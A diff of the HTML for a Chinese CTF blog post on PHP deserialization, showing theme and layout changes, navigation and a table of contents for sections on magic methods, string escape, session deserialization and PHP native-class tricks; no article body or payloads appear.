@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="PHP反序列化是什么知识点: 序列化（Serialization）是将数据结构或对象转换成一种可存储或可传输格式的过程。在序列化后，数据可以被写入文件、发送到网络或存储在数据库中，以便在需要时可以再次还原成原始的数据结构或对象。序列化的过程通常涉及将数据转换成字节流或类似的格式，使其能够在不同平台和编程语言之间进行传输和交换。 反序列化（Deserialization）是序列化的逆过程，即将序列化">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="PHP反序列化">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP反序列化">
 <meta property="og:url" content="https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="PHP反序列化是什么知识点: 序列化（Serialization）是将数据结构或对象转换成一种可存储或可传输格式的过程。在序列化后，数据可以被写入文件、发送到网络或存储在数据库中，以便在需要时可以再次还原成原始的数据结构或对象。序列化的过程通常涉及将数据转换成字节流或类似的格式，使其能够在不同平台和编程语言之间进行传输和交换。 反序列化（Deserialization）是序列化的逆过程，即将序列化">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="PHP反序列化">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250321210048777.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250321211735531.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250414124612334.png">
@@ -33,166 +66,277 @@
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250218163346610.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250218163427394.png">
 <meta property="article:published_time" content="2025-08-12T04:28:19.000Z">
-<meta property="article:modified_time" content="2025-08-12T09:33:20.998Z">
+<meta property="article:modified_time" content="2025-12-01T11:10:08.291Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="PHP反序列化">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250321210048777.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>PHP反序列化</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2025/08/12/PHP反序列化/","title":"PHP反序列化"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/08/12/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bypass/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=PHP反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=PHP反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHP反序列化&body=Check out this article: https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=PHP反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=PHP反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Serialization%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">序列化（Serialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Deserialization%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化（Deserialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">序列化存储格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%A0%87%E5%BF%97"><span class="toc-number">1.4.</span> <span class="toc-text">常见的类型标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%91%98%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">成员类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%91%98%E5%B1%9E%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text">成员属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">成员方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">访问控制修饰符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">__serialize()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">__unserialize魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">__construct()构造方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-%E6%9E%90%E6%9E%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">__destruct()析构方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%E6%96%B9%E6%B3%95"><span class="toc-number">3.5.</span> <span class="toc-text">__toString()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-%E6%96%B9%E6%B3%95"><span class="toc-number">3.6.</span> <span class="toc-text">__sleep()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-%E6%96%B9%E6%B3%95"><span class="toc-number">3.7.</span> <span class="toc-text">__call()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callStatic-%E6%96%B9%E6%B3%95"><span class="toc-number">3.8.</span> <span class="toc-text">__callStatic()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-%E6%96%B9%E6%B3%95"><span class="toc-number">3.9.</span> <span class="toc-text">__get()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-%E6%96%B9%E6%B3%95"><span class="toc-number">3.10.</span> <span class="toc-text">__set()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset-%E6%96%B9%E6%B3%95"><span class="toc-number">3.11.</span> <span class="toc-text">__isset()方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#isset-%E5%87%BD%E6%95%B0"><span class="toc-number">3.11.1.</span> <span class="toc-text">isset()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset-%E6%96%B9%E6%B3%95"><span class="toc-number">3.12.</span> <span class="toc-text">__unset()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke-%E6%96%B9%E6%B3%95"><span class="toc-number">3.13.</span> <span class="toc-text">__invoke()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup-%E6%96%B9%E6%B3%95"><span class="toc-number">3.14.</span> <span class="toc-text">__wakeup()方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">反序列化攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">姿势一：字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%A0%E5%A4%A7%E7%89%B9%E6%80%A7"><span class="toc-number">5.0.1.</span> <span class="toc-text">php反序列化的几大特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">5.0.2.</span> <span class="toc-text">反序列化字符逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A"><span class="toc-number">5.0.3.</span> <span class="toc-text">字符增多</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91"><span class="toc-number">5.0.4.</span> <span class="toc-text">字符减少</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.0.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9Asession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">姿势二：session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="toc-number">6.0.1.</span> <span class="toc-text">什么是session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-session%E6%9C%BA%E5%88%B6"><span class="toc-number">6.0.2.</span> <span class="toc-text">PHP session机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%AD%98%E5%82%A8"><span class="toc-number">6.0.3.</span> <span class="toc-text">session的产生和存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E5%9C%A8php-ini%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">6.0.4.</span> <span class="toc-text">session在php.ini的配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.0.5.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-start-%E5%87%BD%E6%95%B0"><span class="toc-number">6.0.6.</span> <span class="toc-text">session_start()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">6.0.7.</span> <span class="toc-text">攻击原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">关于PHP原生类的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">7.2.</span> <span class="toc-text">遍历文件目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87md5-hash"><span class="toc-number">7.3.</span> <span class="toc-text">绕过md5&#x2F;hash</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        PHP反序列化
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-08-12T04:28:19.000Z" class="dt-published" itemprop="datePublished">2025-08-12</time>
-        
-        (Updated: <time datetime="2025-08-12T09:33:20.998Z" class="dt-updated" itemprop="dateModified">2025-08-12</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">PHP反序列化</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP反序列化 | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="PHP反序列化是什么"><a href="#PHP反序列化是什么" class="headerlink" title="PHP反序列化是什么"></a>PHP反序列化是什么</h2><p>知识点:</p>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.</span> <span class="nav-text">PHP反序列化是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Serialization%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">序列化（Serialization）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Deserialization%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化（Deserialization）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">序列化存储格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%A0%87%E5%BF%97"><span class="nav-number">1.4.</span> <span class="nav-text">常见的类型标志</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%90%E5%91%98%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">成员类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%91%98%E5%B1%9E%E6%80%A7"><span class="nav-number">2.1.</span> <span class="nav-text">成员属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.</span> <span class="nav-text">成员方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-number">2.3.</span> <span class="nav-text">访问控制修饰符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#serialize-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">__serialize()魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unserialize%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">__unserialize魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#construct-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-number">3.3.</span> <span class="nav-text">__construct()构造方法</span></a></li><li class="nav-item 